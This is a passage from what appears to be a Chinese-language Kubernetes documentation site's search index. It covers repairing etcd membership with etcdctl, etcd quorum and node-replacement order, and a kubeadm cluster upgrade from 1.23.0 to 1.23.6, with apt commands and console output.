[upload-certs] Storing the certificates in Secret \"kubeadm-certs\" in the \"kube-system\" Namespace\n# error execution phase upload-certs: error uploading certs: error creating token: timed out waiting for the condition\n# To see the stack trace of this error execute with --v=5 or higher\n\n# \u73b0\u8c61\uff1a\u65e0\u6cd5join\n# \u539f\u56e0\uff1a\u65e0\u6cd5\u5f80etcd\u63d2\u5165\u8282\u70b9\u6570\u636e\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-qa/#25-etcd","title":"2.5 \u7f16\u8f91etcd\u6570\u636e","text":"<p>\u4e0d\u53ef\u884c</p> <p>\u6062\u590d\u6545\u969c</p> <pre><code>etcdctl member remove b9512d2bb2a3c6f5 \\\n  --endpoints=https://10.101.11.154:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n\netcdctl member add k-kube-lab-201 \\\n  --endpoints=https://10.101.11.154:2379 \\\n  --peer-urls=https://10.101.11.238:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n\netcdctl endpoint status \\\n  --endpoints=https://10.101.11.154:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n\netcdctl endpoint status -w table \\\n  --cluster \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key  \n\n# \u539f\u56e0\uff1a\u5f53\u96c6\u7fa4\u4e0d\u53ef\u7528\u65f6etcd\u6570\u636e\u53ea\u652f\u6301\u67e5\u770b\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-qa/#26-control-planejoin","title":"2.6 \u5220\u9664 control-plane\u8282\u70b9\u540e\u518djoin","text":"<p>\u53ef\u884c</p> <p>\u6062\u590d\u6545\u969c</p> <pre><code># etcd member \u8282\u70b9\u4fe1\u606f\u8fd8\u5b58\u5728\u9700\u8981\u5148\u624b\u52a8\u79fb\u9664\netcdctl member remove 1bd3101f2cbe0fab \\\n  --endpoints=https://10.101.11.154:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n# \u539f\u56e0\uff1a\u82e5\u4e0d  \n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-qa/#27-etcd","title":"2.7 etcd\u6570\u636e\u4e0d\u4e00\u81f4","text":"<p>Reference</p> <pre><code>+---------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+\n|         ENDPOINT          |        ID        | VERSION | DB SIZE | IS LEADER | IS LEARNER | RAFT TERM | RAFT INDEX | RAFT APPLIED INDEX | ERRORS |\n+---------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+\n| https://10.101.11.240:2379 | 5fa87e503b09d83d |   3.5.1 |  112 MB |      true |      false |         3 |  309461550 |          309461550 |        |\n| https://10.101.11.114:2379 | 797dc1cea3a53a6b |   3.5.1 |  119 MB |     false |      false |         3 |  309461550 |          309461550 |        |\n| https://10.101.11.154:2379 | 8ac0782f040c745a |   3.5.1 |  123 MB |     false |      false |         3 |  309461550 |          309461550 |        |\n+---------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+\n</code></pre> <p>etcd performance</p>"},{"location":"kubernetes/06-cluster-upgrade-qa/#_3","title":"\u4e09\u3001\u756a\u5916\u7bc7","text":""},{"location":"kubernetes/06-cluster-upgrade-qa/#31-cluser-size","title":"3.1 \u6210\u5458\u6570\u91cf(cluser size)","text":"<p>\u8fd9\u91cc\u4e3b\u8981\u6d89\u53ca\u5230\u4e24\u70b9\u3002\u9996\u5148\u662f\u4e00\u4e2aetcd cluster\u7684\u8282\u70b9\u6570\u91cf\u6700\u597d\u662f\u5947\u6570\uff0c\u4e24\u4e2a\u539f\u56e0\uff1a</p> <ol> <li>\u5bf9\u5e94\u7684\u5076\u6570\u4e2a\u8282\u70b9(\u5947\u6570+1)\u80fd\u5bb9\u5fcd\u7684\u5931\u8d25\u8282\u70b9\u6570\u91cf\u8fd8\u662f\u4e00\u6837\u7684\u3002\u4f8b\u59823\u4e2a\u8282\u70b9\u65f6\uff0c\u80fd\u5bb9\u5fcd\u4e00\u4e2a\u8282\u70b9down\uff0c4\u4e2a\u8282\u70b9\u65f6\u540c\u6837\u53ea\u80fd\u5bb9\u5fcd\u4e00\u4e2a\u8282\u70b9down\u3002\u4f46\u662f\u8282\u70b9\u589e\u591a\uff0c\u5bfc\u81f4\u5931\u8d25\u7684\u6982\u7387\u4f1a\u589e\u5927\uff1b</li> <li>\u5728\u53d1\u751f\u7f51\u7edc\u5206\u533a\uff0c\u5c06cluster\u9694\u79bb\u6210\u4e24\u4e2a\u5c0f\u56e2\u4f53\u65f6\uff0c\u603b\u6709\u4e00\u4e2a\u56e2\u4f53\u80fd\u6ee1\u8db3quorum(\u6cd5\u5b9a\u7968\u6570)\uff0c\u4ece\u800c\u80fd\u7ee7\u7eed\u63d0\u4f9b\u670d\u52a1\u3002\u4f46\u662f\u5bf9\u4e8e\u5076\u6570\u4e2a\u8282\u70b9\uff0c\u5219\u6709\u53ef\u80fd\u4e24\u4e2a\u9694\u79bb\u7684\u5206\u533a\u90fd\u65e0\u6cd5\u63d0\u4f9b\u670d\u52a1\u3002</li> </ol> <p>\u53e6\u5916\u4e00\u70b9\u5c31\u662f\u5173\u4e8ecluster\u8282\u70b9\u6570\u91cf\u7684\u4e0a\u9650\u95ee\u9898\u3002\u867d\u7136\u4e0a\u9650\u6ca1\u6709\u9650\u5236\uff0c\u4f46\u662f\u4e00\u4e2aetcd cluster\u6700\u597d\u4e0d\u8981\u8d85\u8fc77\u4e2a\u8282\u70b9\u3002\u4e00\u65b9\u9762\uff0c\u8282\u70b9\u6570\u91cf\u589e\u52a0\u7684\u786e\u53ef\u4ee5\u589e\u52a0\u5bb9\u9519\u7387\uff0c\u4f8b\u59827\u4e2a\u8282\u70b9\u53ef\u4ee5\u5bb9\u5fcd3\u4e2adown\uff0c9\u4e2a\u5219\u53ef\u4ee5\u5bb9\u5fcd4\u4e2adown\u3002\u4f46\u662f\u53e6\u4e00\u65b9\u9762\uff0c\u8282\u70b9\u6570\u91cf\u589e\u52a0\uff0c\u540c\u6837\u4e5f\u4f1a\u5bfc\u81f4quorum\u589e\u5927\uff0c\u4f8b\u59827\u4e2a\u8282\u70b9\u7684quorum\u662f4\uff0c9\u4e2a\u8282\u70b9\u7684quorum\u5219\u662f5\uff1b\u56e0\u4e3aetcd\u662f\u5f3a\u4e00\u81f4\u6027K/V DB\uff0c\u6bcf\u4e00\u4e2a\u5199\u8bf7\u6c42\u5fc5\u987b\u81f3\u5c11quorum\u4e2a\u8282\u70b9\u90fd\u5199\u6210\u529f\u624d\u80fd\u8fd4\u56de\u6210\u529f\uff0c\u6240\u4ee5\u8282\u70b9\u6570\u91cf\u589e\u52a0\u4f1a\u964d\u4f4e\u5199\u8bf7\u6c42\u7684\u6027\u80fd\u3002</p>"},{"location":"kubernetes/06-cluster-upgrade-qa/#32","title":"3.2 \u66ff\u6362\u8282\u70b9\u7684\u6b63\u786e\u59ff\u52bf","text":"<p>\u5f53cluster\u4e2d\u67d0\u4e2a\u8282\u70b9down\u4e86\uff0c\u4e00\u822c\u9700\u8981\u628a\u8fd9\u4e2a\u8282\u70b9\u4ececluster\u4e2d\u79fb\u9664\uff0c\u5e76\u589e\u52a0\u4e00\u4e2a\u65b0\u7684\u8282\u70b9\u5230cluster\u4e2d\u53bb\u3002</p> <p>\u8fd9\u91cc\u4e00\u5b9a\u8981\u6ce8\u610f\uff0c\u8981\u5148\u5220\u9664\u8001\u8282\u70b9\uff0c\u7136\u540e\u518d\u589e\u52a0\u65b0\u8282\u70b9\u3002\u5148\u5220\u9664\u540e\u589e\u52a0\uff0c\u5148\u5220\u9664\u540e\u589e\u52a0\uff0c\u91cd\u8981\u7684\u4e8b\u60c5\u8bf4\u4e09\u904d\uff01\u8fd9\u4e2a\u987a\u5e8f\u4e0d\u80fd\u53cd\u4e86\uff0c\u5982\u679c\u5148\u589e\u52a0\u65b0\u8282\u70b9\uff0c\u7136\u540e\u518d\u5220\u9664\u8001\u8282\u70b9\uff0c\u6709\u53ef\u80fd\u5bfc\u81f4cluster\u65e0\u6cd5\u5de5\u4f5c\uff0c\u5e76\u4e14\u6c38\u8fdc\u4e5f\u65e0\u6cd5\u81ea\u52a8\u6062\u590d\uff0c\u5c31\u5fc5\u987b\u4eba\u5de5\u5e72\u9884\u4e86\u3002</p> <p>\u8fd9\u91cc\u4e3e\u4e00\u4e2a\u4f8b\u5b50\u6765\u8bf4\u660e\u3002\u5047\u8bbecluster\u6709\u4e09\u4e2a\u8282\u70b9\uff0c\u5176\u4e2d\u4e00\u4e2a\u8282\u70b9\u7a81\u7136\u53d1\u751f\u6545\u969c\u3002\u8fd9\u65f6cluster\u4e2d\u8fd8\u6709\u4e24\u4e2a\u8282\u70b9\u5065\u5eb7\uff0c\u4f9d\u7136\u6ee1\u8db3quorum\uff0c\u6240\u4ee5cluster\u8fd8\u53ef\u4ee5\u6b63\u5e38\u63d0\u4f9b\u670d\u52a1\u3002\u8fd9\u65f6\u5982\u679c\u5148\u589e\u52a0\u4e00\u4e2a\u65b0\u8282\u70b9\u5230cluster\u4e2d\uff0c\u56e0\u4e3a\u90a3\u4e2adown\u7684\u8282\u70b9\u8fd8\u6ca1\u6709\u4ececluster\u4e2d\u79fb\u9664\uff0c\u6240\u4ee5cluster\u7684\u8282\u70b9\u6570\u91cf\u5c31\u53d8\u6210\u4e864\u3002\u5982\u679c\u4e00\u5207\u987a\u5229\uff0c\u65b0\u8282\u70b9\u6b63\u5e38\u542f\u52a8\uff0c\u5012\u4e5f\u8fd8\u597d\u3002\u4f46\u662f\u5982\u679c\u53d1\u751f\u4e86\u610f\u5916\uff08\u6bd4\u5982\u914d\u7f6e\u9519\u8bef\uff09\uff0c\u5bfc\u81f4\u65b0\u589e\u52a0\u7684\u8282\u70b9\u542f\u52a8\u5931\u8d25\uff0c\u8fd9\u65f6cluster\u7684quorum\u5df2\u7ecf\u4ece2\u53d8\u6210\u4e863\uff0c\u53ef\u662fcluster\u4e2d\u4f9d\u7136\u53ea\u6709\u4e24\u4e2a\u8282\u70b9\u80fd\u5de5\u4f5c\uff0c\u4e0d\u7b26\u5408quorum\u8981\u6c42\uff0c\u4ece\u800c\u5bfc\u81f4cluster\u65e0\u6cd5\u5bf9\u5916\u63d0\u4f9b\u670d\u52a1\uff0c\u800c\u4e14\u6c38\u8fdc\u65e0\u6cd5\u81ea\u52a8\u6062\u590d\u3002\u8fd9\u4e2a\u65f6\u5019\uff0c\u5f53\u4f60\u518d\u60f3\u4ececluster\u4e2d\u5220\u9664\u4efb\u4f55\u8282\u70b9\uff0c\u90fd\u4e0d\u4f1a\u6210\u529f\u4e86\uff0c\u56e0\u4e3a\u5220\u9664\u8282\u70b9\u4e5f\u9700\u8981\u5411cluster\u4e2d\u53d1\u9001\u4e00\u4e2a\u5199\u8bf7\u6c42\uff0c\u8fd9\u65f6cluster\u5df2\u7ecf\u56e0\u4e3aquorum\u4e0d\u8fbe\u6807\u800c\u65e0\u6cd5\u63d0\u4f9b\u670d\u52a1\u4e86\uff0c\u6240\u4ee5\u5220\u9664\u8282\u70b9\u7684\u64cd\u4f5c\u4e0d\u4f1a\u6210\u529f\u3002\u8fd9\u5c31\u5c34\u5c2c\u4e86\uff01</p>"},{"location":"kubernetes/06-cluster-upgrade/","title":"Upgrade","text":"<p>\u5b98\u65b9\u9610\u8ff0 Kubernetes \u53d1\u5e03\u5468\u671f </p> <p></p> <p>Kubernetes Cluster \u5347\u7ea7\u662f\u4e00\u4ef6\u5fc5\u8981\u7684\u4e8b\u60c5\u3002</p> <p>\u7531\u4e8e kubernetes \u66f4\u65b0\u5b9e\u5728\u592a\u9891\u7e41\u4e86\uff0c\u4e00\u65e6\u843d\u540e\u592a\u591a\u7248\u672c\uff0c\u5f88\u591a\u65b0\u7279\u6027\u5c31\u4f1a\u4f7f\u7528\u4e0d\u4e0a\uff0c\u540c\u65f6\u5f88\u591a\u7684\u8865\u4e01\u4e5f\u65e0\u6cd5\u53ca\u65f6\u4eab\u7528\u3002</p> <ul> <li>Kubernetes \u9879\u76ee\u7ef4\u62a4\u6700\u8fd1\u7684\u4e09\u4e2a\u6b21\u8981\u7248\u672c\uff08\u59821.26\u30011.25\u30011.24\uff09\u7684\u53d1\u5e03\u5206\u652f</li> <li>kubernetes\u9879\u76ee\u5b58\u57283\u7c7b\u5206\u652f(branch)\uff0c\u5206\u522b\u4e3a<code>master</code>\uff0c<code>release-X.Y</code>,<code>release-X.Y.Z</code></li> <li>X - \u4e3b\u8981\u7248\u672c</li> <li>Y - \u6b21\u8981\u7248\u672c</li> <li>Z - \u8865\u4e01\u7248\u672c</li> <li>\u6bcf\u4e00\u4e2aAPI group\u7ef4\u62a4\u77403\u4e2a\u4e3b\u8981\u7248\u672c\uff0c\u5206\u522b\u662f<code>GA</code>\uff0c<code>Beta</code>\uff0c<code>Alpha</code></li> <li>GA - \u5411\u4e0b\u517c\u5bb912\u4e2a\u6708\u62163\u4e2a\u53d1\u884c\u7248</li> <li>Beta - 9\u4e2a\u6708\u62163\u4e2a\u53d1\u884c\u7248</li> <li>Alpha - \u7acb\u523b\u542f\u7528</li> <li>\u5347\u7ea7\u96c6\u7fa4\u7406\u8bba\u4e0a\u53ea\u652f\u6301\u8de8\u5ea6\u4e3a2\u4e2a\u6b21\u8981\u7248\u672c\u7684\u64cd\u4f5c</li> </ul> <p>\u8fd9\u91cc\u6f14\u793a\u6211\u7684\u4e00\u6b21\u5347\u7ea7\u8fc7\u7a0b\u3002</p> <p>Reference</p> <ul> <li> <p>Upgrading kubeadm clusters | Kubernetes</p> </li> <li> <p>Kubeadm upgrade | Kubernetes</p> </li> </ul> <p>\u5347\u7ea7\u524d\u540e\u7248\u672c\u5bf9\u6bd4</p> \u8f6f\u4ef6\u540d\u79f0 \u5f53\u524d\u7248\u672c \u5347\u7ea7\u7248\u672c kubeadm 1.23.0-00 1.23.6-00 kubelet 1.23.0-00 1.23.6-00 kubernetes 1.23.0-00 1.23.6-00 etcd 3.4.13-0 v3.5.1 flannel v0.15.0 v0.15.1 coredns 1.8.6 1.8.6 containerd 1.5.5-0ubuntu3~20.04.1 1.5.9-0ubuntu1~20.04.1 <p>\u4f18\u5316\u8bbf\u95ee\u955c\u50cf</p>"},{"location":"kubernetes/06-cluster-upgrade/#_1","title":"\u4e00\u3001\u5347\u7ea7\u4e8c\u8fdb\u5236","text":"<pre><code>apt update\napt-mark showhold\n\n# containerd\napt install -y --allow-change-held-packages containerd=1.5.9-0ubuntu1~20.04.1\n\n# kubernetes\napt install -y --allow-change-held-packages kubeadm=1.23.6-00 kubectl=1.23.6-00 kubelet=1.23.6-00\n\n# validate\ndpkg -l | grep -E \"kube|containerd\"\ncontainerd --version\nkubeadm version\n\n# hold\napt-mark hold containerd kubeadm kubectl kubelet &amp;&amp; apt-mark showhold\n\n# lib\nls -l /var/lib/{containerd,etcd,kubelet}\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade/#_2","title":"\u4e8c\u3001\u5347\u7ea7\u96c6\u7fa4","text":"<pre><code>systemctl restart containerd\n\n# \u67e5\u770b\u5347\u7ea7\u8ba1\u5212\nkubeadm upgrade plan \n\n# \u5347\u7ea7\u96c6\u7fa4 &lt;\u4ec5\u9700\u8981\u5728\u4e00\u53f0master\u8282\u70b9\u6267\u884c\u4e00\u6b21&gt;\nkubeadm upgrade apply v1.23.6 -v 5\n\n# \u91cd\u542fkubelet &lt;\u914d\u7f6e\u672a\u968fkubernetes\u5347\u7ea7&gt;\nsed -i 's/pause:3.5/pause:3.6/' /var/lib/kubelet/kubeadm-flags.env\nsystemctl restart kubelet\nsystemctl status kubelet\n\n# \u4f9d\u6b21\u5347\u7ea7\u5269\u4e0bcontrol-plane/node\u8282\u70b9\nkubeadm upgrade node -v 5\n\n# \u67e5\u770b\u8282\u70b9\u7ec4\u4ef6\u8bc1\u4e66\u7b7e\u540d\nkubeadm certs check-expiration\n\n# \u5347\u7ea7coredns &lt;\u672a\u968fkubernetes\u5347\u7ea7&gt;\nkubectl -n kube-system edit deployment.apps/coredns\n# hub.8ops.top/google_containers/coredns:1.8.4 --&gt; 1.8.6\n\n# \u67e5\u770b\u96c6\u7fa4\u57fa\u7840\u7ec4\u4ef6\u8fd0\u884c\nkubectl -n kube-system get all\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade/#_3","title":"\u4e09\u3001\u8f93\u51fa\u6548\u679c","text":""},{"location":"kubernetes/06-cluster-upgrade/#31","title":"3.1 \u5347\u7ea7\u4e8c\u8fdb\u5236","text":"<p>\u5347\u7ea7\u4e8c\u8fdb\u5236\u5305</p> <pre><code>root@K-KUBE-LAB-01:~# apt install kubeadm=1.23.0-00 kubectl=1.23.0-00 kubelet=1.23.0-00\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following packages will be upgraded:\n  kubeadm kubectl kubelet\n3 upgraded, 0 newly installed, 0 to remove and 88 not upgraded.\nNeed to get 37.0 MB of archives.\nAfter this operation, 29.8 MB disk space will be freed.\nGet:1 https://mirrors.aliyun.com/kubernetes/apt kubernetes-xenial/main amd64 kubelet amd64 1.23.0-00 [19.5 MB]\nGet:2 https://mirrors.aliyun.com/kubernetes/apt kubernetes-xenial/main amd64 kubectl amd64 1.23.0-00 [8,932 kB]\nGet:3 https://mirrors.aliyun.com/kubernetes/apt kubernetes-xenial/main amd64 kubeadm amd64 1.23.0-00 [8,588 kB]\nFetched 37.0 MB in 11s (3,437 kB/s)\n(Reading database ... 64615 files and directories currently installed.)\nPreparing to unpack .../kubelet_1.23.0-00_amd64.deb ...\nUnpacking kubelet (1.23.0-00) over (1.22.2-00) ...\nPreparing to unpack .../kubectl_1.23.0-00_amd64.deb ...\nUnpacking kubectl (1.23.0-00) over (1.22.2-00) ...\nPreparing to unpack .../kubeadm_1.23.0-00_amd64.deb ...\nUnpacking kubeadm (1.23.0-00) over (1.22.2-00) ...\nSetting up kubectl (1.23.0-00) ...\nSetting up kubelet (1.23.0-00) ...\nSetting up kubeadm (1.23.0-00) ...\n</code></pre> <p>\u67e5\u9a8c\u4e8c\u8fdb\u5236\u5b89\u88c5\u60c5\u51b5</p> <pre><code>root@K-KUBE-LAB-01:~# dpkg -l | grep kube &amp;&amp; kubeadm version\nii  kubeadm                              1.23.0-00                         amd64        Kubernetes Cluster Bootstrapping Tool\nii  kubectl                              1.23.0-00                         amd64        Kubernetes Command Line Tool\nii  kubelet                              1.23.0-00                         amd64        Kubernetes Node Agent\nii  kubernetes-cni                       0.8.7-00                          amd64        Kubernetes CNI\nkubeadm version: &amp;version.Info{Major:\"1\", Minor:\"23\", GitVersion:\"v1.23.0\", GitCommit:\"ab69524f795c42094a6630298ff53f3c3ebab7f4\", GitTreeState:\"clean\", BuildDate:\"2021-12-07T18:15:11Z\", GoVersion:\"go1.17.3\", Compiler:\"gc\", Platform:\"linux/amd64\"}\n\nroot@K-KUBE-LAB-01:~# apt-mark hold kubeadm kubectl kubelet &amp;&amp; apt-mark showhold\nkubeadm set on hold.\nkubectl set on hold.\nkubelet set on hold.\ncontainerd\nkubeadm\nkubectl\nkubelet\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade/#32","title":"3.2 \u5347\u7ea7\u96c6\u7fa4","text":"<p>\u67e5\u770b\u5347\u7ea7\u8ba1\u5212</p> <pre><code>root@K-KUBE-LAB-01:/opt# kubeadm upgrade plan\n[upgrade/config] Making sure the configuration is correct:\n[upgrade/config] Reading configuration from the cluster...\n[upgrade/config] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\n[preflight] Running pre-flight checks.\n[upgrade] Running cluster health checks\n[upgrade] Fetching available versions to upgrade to\n[upgrade/versions] Cluster version: v1.22.0\n[upgrade/versions] kubeadm version: v1.23.0\n[upgrade/versions] Target version: v1.23.0\n[upgrade/versions] Latest version in the v1.23 series: v1.23.0\n\nComponents that must be upgraded manually after you have upgraded the control plane with 'kubeadm upgrade apply':\nCOMPONENT   CURRENT       TARGET\nkubelet     5 x v1.23.0   v1.23.0\n\nUpgrade to the latest version in the v1.23 series:\n\nCOMPONENT                 CURRENT   TARGET\nkube-apiserver            v1.23.0   v1.23.0\nkube-controller-manager   v1.23.0   v1.23.0\nkube-scheduler            v1.23.0   v1.23.0\nkube-proxy                v1.23.0   v1.23.0\nCoreDNS                   1.8.4     v1.8.6\netcd                      3.5.1-0   3.5.1-0\n\nYou can now apply the upgrade by executing the following command:\n\n    kubeadm upgrade apply v1.23.0\n\nNote: Before you can perform this upgrade, you have to update kubeadm to v1.23.0.\n\n_____________________________________________________________________\n\n\nThe table below shows the current state of component configs as understood by this version of kubeadm.\nConfigs that have a \"yes\" mark in the \"MANUAL UPGRADE REQUIRED\" column require manual config upgrade or\nresetting to kubeadm defaults before a successful upgrade can be performed. The version to manually\nupgrade to is denoted in the \"PREFERRED VERSION\" column.\n\nAPI GROUP                 CURRENT VERSION   PREFERRED VERSION   MANUAL UPGRADE REQUIRED\nkubeproxy.config.k8s.io   v1alpha1          v1alpha1            no\nkubelet.config.k8s.io     v1beta1           v1beta1             no\n_____________________________________________________________________\n</code></pre> <p>\u5347\u7ea7\u96c6\u7fa4</p> <pre><code>root@K-KUBE-LAB-01:/opt# kubeadm upgrade apply v1.23.0\n[upgrade/config] Making sure the configuration is correct:\n[upgrade/config] Reading configuration from the cluster...\n[upgrade/config] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\n[preflight] Running pre-flight checks.\n[upgrade] Running cluster health checks\n[upgrade/version] You have chosen to change the cluster version to \"v1.23.0\"\n[upgrade/versions] Cluster version: v1.23.0\n[upgrade/versions] kubeadm version: v1.23.0\n[upgrade/confirm] Are you sure you want to proceed with the upgrade? [y/N]: y\n[upgrade/prepull] Pulling images required for setting up a Kubernetes cluster\n[upgrade/prepull] This might take a minute or two, depending on the speed of your internet connection\n[upgrade/prepull] You can also perform this action in beforehand using 'kubeadm config images pull'\n[upgrade/apply] Upgrading your Static Pod-hosted control plane to version \"v1.23.0\"...\nStatic pod: kube-apiserver-k-kube-lab-01 hash: e300612cfc9bddbfe269ef9f69c6a68f\nStatic pod: kube-controller-manager-k-kube-lab-01 hash: 852bdcee5effb8966c5dfb63a6d52e1b\nStatic pod: kube-scheduler-k-kube-lab-01 hash: 0f85f2476aad9da7c200af3e1f1151b3\n[upgrade/etcd] Upgrading to TLS for etcd\nStatic pod: etcd-k-kube-lab-01 hash: 22ac6fef1edf96d0d47ae64814294c48\n[upgrade/staticpods] Preparing for \"etcd\" upgrade\n[upgrade/staticpods] Current and new manifests of etcd are equal, skipping upgrade\n[upgrade/etcd] Waiting for etcd to become available\n[upgrade/staticpods] Writing new Static Pod manifests to \"/etc/kubernetes/tmp/kubeadm-upgraded-manifests2109837075\"\n[upgrade/staticpods] Preparing for \"kube-apiserver\" upgrade\n[upgrade/staticpods] Current and new manifests of kube-apiserver are equal, skipping upgrade\n[upgrade/staticpods] Preparing for \"kube-controller-manager\" upgrade\n[upgrade/staticpods] Current and new manifests of kube-controller-manager are equal, skipping upgrade\n[upgrade/staticpods] Preparing for \"kube-scheduler\" upgrade\n[upgrade/staticpods] Current and new manifests of kube-scheduler are equal, skipping upgrade\n[upgrade/postupgrade] Applying label node-role.kubernetes.io/control-plane='' to Nodes with label node-role.kubernetes.io/master='' (deprecated)\n[upload-config] Storing the configuration used in ConfigMap \"kubeadm-config\" in the \"kube-system\" Namespace\n[kubelet] Creating a ConfigMap \"kubelet-config-1.23\" in namespace kube-system with the configuration for the kubelets in the cluster\nNOTE: The \"kubelet-config-1.23\" naming of the kubelet ConfigMap is deprecated. Once the UnversionedKubeletConfigMap feature gate graduates to Beta the default name will become just \"kubelet-config\". Kubeadm upgrade will handle this transition transparently.\n[kubelet-start] Writing kubelet configuration to file \"/var/lib/kubelet/config.yaml\"\n[bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to get nodes\n[bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials\n[bootstrap-token] configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token\n[bootstrap-token] configured RBAC rules to allow certificate rotation for all node client certificates in the cluster\n[addons] Applied essential addon: CoreDNS\n[addons] Applied essential addon: kube-proxy\n\n[upgrade/successful] SUCCESS! Your cluster was upgraded to \"v1.23.0\". Enjoy!\n\n[upgrade/kubelet] Now that your control plane is upgraded, please proceed with upgrading your kubelets if you haven't already done so.\n</code></pre> <p>\u91cd\u542fkubelet</p> <pre><code>root@K-KUBE-LAB-01:/opt# cat /var/lib/kubelet/kubeadm-flags.env\nKUBELET_KUBEADM_ARGS=\"--container-runtime=remote --container-runtime-endpoint=/run/containerd/containerd.sock --pod-infra-container-image=hub.8ops.top/google_containers/pause:3.6\"\n</code></pre> <p>\u5347\u7ea7control-plane\u8282\u70b9</p> <pre><code>[upgrade] Reading configuration from the cluster...\n[upgrade] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\n[preflight] Running pre-flight checks\n[preflight] Pulling images required for setting up a Kubernetes cluster\n[preflight] This might take a minute or two, depending on the speed of your internet connection\n[preflight] You can also perform this action in beforehand using 'kubeadm config images pull'\n[upgrade] Upgrading your Static Pod-hosted control plane instance to version \"v1.23.0\"...\nStatic pod: kube-apiserver-k-kube-lab-02 hash: 72ef403458c0e6cc4a2a881a7a1e87a1\nStatic pod: kube-controller-manager-k-kube-lab-02 hash: 091e5187c5ddc3ba94ea9972160ab10f\nStatic pod: kube-scheduler-k-kube-lab-02 hash: bc1ed2e4c30353dc774c55cd248bfe8e\n[upgrade/etcd] Upgrading to TLS for etcd\nStatic pod: etcd-k-kube-lab-02 hash: 64eadc3c867a01c762c2266ad4b7112a\n[upgrade/staticpods] Preparing for \"etcd\" upgrade\n[upgrade/staticpods] Current and new manifests of etcd are equal, skipping upgrade\n[upgrade/etcd] Waiting for etcd to become available\n[upgrade/staticpods] Writing new Static Pod manifests to \"/etc/kubernetes/tmp/kubeadm-upgraded-manifests1190914493\"\n[upgrade/staticpods] Preparing for \"kube-apiserver\" upgrade\n[upgrade/staticpods] Current and new manifests of kube-apiserver are equal, skipping upgrade\n[upgrade/staticpods] Preparing for \"kube-controller-manager\" upgrade\n[upgrade/staticpods] Current and new manifests of kube-controller-manager are equal, skipping upgrade\n[upgrade/staticpods] Preparing for \"kube-scheduler\" upgrade\n[upgrade/staticpods] Current and new manifests of kube-scheduler are equal, skipping upgrade\n[upgrade] The control plane instance for this node was successfully updated!\n[kubelet-start] Writing kubelet configuration to file \"/var/lib/kubelet/config.yaml\"\n[upgrade] The configuration for this node was successfully updated!\n[upgrade] Now you should go ahead and upgrade the kubelet package using your package manager.\n</code></pre> <p>\u5347\u7ea7node\u8282\u70b9</p> <pre><code>[upgrade] Reading configuration from the cluster...\n[upgrade] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\n[preflight] Running pre-flight checks\n[preflight] Skipping prepull. Not a control plane node.\n[upgrade] Skipping phase. Not a control plane node.\n[kubelet-start] Writing kubelet configuration to file \"/var/lib/kubelet/config.yaml\"\n[upgrade] The configuration for this node was successfully updated!\n[upgrade] Now you should go ahead and upgrade the kubelet package using your package manager.\n</code></pre> <p>\u67e5\u770b\u8282\u70b9\u7ec4\u4ef6\u8bc1\u4e66\u7b7e\u540d</p> <pre><code>root@K-KUBE-LAB-01:~# kubeadm certs check-expiration\n[check-expiration] Reading configuration from the cluster...\n[check-expiration] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\n\nCERTIFICATE                EXPIRES                  RESIDUAL TIME   CERTIFICATE AUTHORITY   EXTERNALLY MANAGED\nadmin.conf                 Dec 23, 2022 02:44 UTC   364d                                    no\napiserver                  Dec 23, 2022 02:27 UTC   364d            ca                      no\napiserver-etcd-client      Dec 23, 2022 02:27 UTC   364d            etcd-ca                 no\napiserver-kubelet-client   Dec 23, 2022 02:27 UTC   364d            ca                      no\ncontroller-manager.conf    Dec 23, 2022 02:28 UTC   364d                                    no\netcd-healthcheck-client    Dec 23, 2022 02:27 UTC   364d            etcd-ca                 no\netcd-peer                  Dec 23, 2022 02:27 UTC   364d            etcd-ca                 no\netcd-server                Dec 23, 2022 02:27 UTC   364d            etcd-ca                 no\nfront-proxy-client         Dec 23, 2022 02:27 UTC   364d            front-proxy-ca          no\nscheduler.conf             Dec 23, 2022 02:28 UTC   364d                                    no\n\nCERTIFICATE AUTHORITY   EXPIRES                  RESIDUAL TIME   EXTERNALLY MANAGED\nca                      Dec 08, 2031 05:54 UTC   9y              no\netcd-ca                 Dec 08, 2031 05:54 UTC   9y              no\nfront-proxy-ca          Dec 08, 2031 05:54 UTC   9y              no\n</code></pre> <p>\u67e5\u770bcoredns\u8fd0\u884c</p> <pre><code>root@K-KUBE-LAB-02:~# kubectl -n kube-system get all -l k8s-app=kube-dns -o wide\nNAME                           READY   STATUS    RESTARTS   AGE   IP            NODE            NOMINATED NODE   READINESS GATES\npod/coredns-7b8886d7cd-c27r6   1/1     Running   0          40s   172.20.4.14   k-kube-lab-05   &lt;none&gt;           